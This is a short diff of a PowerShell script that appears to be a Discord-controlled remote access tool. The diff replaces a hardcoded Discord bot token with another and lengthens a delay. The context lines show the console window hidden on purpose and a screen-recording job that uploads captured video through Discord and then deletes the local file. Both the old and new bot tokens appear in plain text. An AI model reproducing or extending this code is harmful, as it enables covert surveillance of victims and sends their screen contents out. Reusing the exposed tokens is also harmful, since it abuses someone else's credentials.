@@ -1,6 +1,6 @@
 
 # =====================================================================================================================================================
-$global:token = "MTQ3MzkwMjk2NjA1MzUzNTc5NA.GOX2VE.Dvhb6JU7RVpDA6Er-etOmWDih7Afdm-PaciR_M" # make sure your bot is in ONE server only
+$global:token = "MTQ3MzkwMjk2NjA1MzUzNTc5NA.GVBRI2.kOAks2eLZWUxam0ttKDrm8W4tKSPlbhrpecZyg" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
@@ -1657,7 +1657,7 @@ $screenJob = {
         sendFile -sendfilePath $mkvPath | Out-Null
         sleep 5
         rm -Path $mkvPath -Force
-        sleep 1
+        sleep 10
     }
 }
 
@@ -1896,5 +1896,6 @@ while ($true) {
     }
     Sleep 3
 }
+
 
 
